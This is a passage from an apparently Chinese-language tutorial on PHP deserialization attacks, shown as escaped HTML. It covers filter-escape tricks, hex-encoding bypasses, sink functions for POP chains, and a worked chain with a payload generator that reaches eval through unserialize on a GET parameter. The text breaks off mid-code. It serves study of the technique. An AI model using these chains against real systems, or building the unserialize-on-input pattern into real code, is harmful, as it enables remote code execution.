class=&#34;line&#34;&gt;过滤前&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a:2:&amp;#123;s:7:&amp;quot;phpflag&amp;quot;;s:48:&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;img&amp;quot;;s:20:&amp;quot;ZDBnM19mMWFnLnBocA==&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;过滤后&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a:2:&amp;#123;s:7:&amp;quot;&amp;quot;;s:48:&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;img&amp;quot;;s:20:&amp;quot;ZDBnM19mMWFnLnBocA==&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;下面的步骤和值替换一样&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这里的键名变为&amp;quot;;s:48: 实现了逃逸&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;0x05pop-链利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x05pop-链利用&#34;&gt;#&lt;/a&gt; 0x05POP 链利用&lt;/h4&gt;
&lt;p&gt;上面的例子都是基于 &amp;quot;自动调用&amp;quot; 的 magic function。** 但当漏洞 / 危险代码存在类的普通方法中，就不能指望通过 &amp;quot;自动调用&amp;quot; 来达到目的了。** 这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说在代码审计的时候我们都要盯紧这些敏感函数的，层层递进，最终去构造出一个有杀伤力的 payload。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 一些有用的 POP 链中出现的方法：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;- 命令执行：exec()、passthru()、popen()、system()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- 文件操作：file_put_contents()、file_get_contents()、unlink()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- 代码执行：eval()、assert()、call_user_func()   //call_user_func(assert,phpinfo());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;2. 反序列化中为了避免信息丢失，使用大写 S 支持字符串的编码。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PHP 为了更加方便进行反序列化 Payload 的 传输与显示 (避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示，使用如下形式即可绕过，即：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;s:4:&amp;quot;user&amp;quot;; -&amp;gt; S:4:&amp;quot;use\72&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;3. 深浅 copy&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在 php 中如果我们使用 &amp;amp; 对变量 A 的值指向变量 B，这个时候是属于浅拷贝，当变量 B 改变时，变量 A 也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$A = &amp;amp;$B; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;4. 利用 PHP 伪协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;配合 PHP 伪协议实现文件包含、命令执行等漏洞。如 glob:// 伪协议查找匹配的文件路径模式。&lt;/p&gt;
&lt;h4 id=&#34;0x06&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x06&#34;&gt;#&lt;/a&gt; 0x06&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class main &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    protected $ClassObj;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function __construct() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;ClassObj = new normal();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function __destruct() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;ClassObj-&amp;gt;action();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class normal &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function action() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;quot;hello bmjoker&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class evil &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private $data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function action() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        eval($this-&amp;gt;data);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//$a = new main();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unserialize($_GET[&amp;#x27;a&amp;#x27;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;危险的命令执行方法 eval 不在魔术方法中，在 evil 类中。但是魔术方法__construct () 是调用 normal 类，__destruct () 在程序结束时会去调用 normal 类中的 action () 方法。而我们最终的目的是去调用 evil 类中的 action () 方法，并伪造 evil 类中的变量data，达成任意代码执行的目的。这样的话可以尝试去构造POP利用链，让魔术方法__construct()去调用evil这个类，并且给变量 data 赋予恶意代码，比如 php 探针 phpinfo ()，这样就相当于执行 &lt;code&gt;&amp;lt;?php eval(&amp;quot;phpinfo();&amp;quot;)?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$ClassObj&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;evil&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;evil&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;phpinfo()&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;main&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者这样构造也行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$ClassObj&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;ClassObj = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;evil&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;evil&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;phpinfo();&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;main&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;但是由于&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mtext&gt;是&lt;/mtext&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mtext&gt;类型修饰，&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;ClassObj是protected类型修饰，&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;类&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;型&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;修&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;饰&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;data 是 private 类型修饰，在序列化的时候，多出来的字节都被 \x00 填充，需要进行在代码中使用 urlencode 对序列化后字符串进行编码，否则无法复制解析。&lt;/p&gt;
&lt;p&gt;或者直接改不可见字符为 %00&lt;/p&gt;
&lt;p&gt;url 地址栏中会自动帮我们解析一次 url 编码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;0x07&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x07&#34;&gt;#&lt;/a&gt; 0x07&lt;/h4&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;MyFile&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$user&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$user&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;name = &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;user = &lt;span class=&#34;variable&#34;&gt;$user&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__wakeup&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;stristr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;name, &lt;span class=&#34;string&#34;&gt;&amp;quot;flag&amp;quot;&lt;/span&gt;)!==False) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;name = &lt;span class=&#34;string&#34;&gt;&amp;quot;/etc/hostname&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span 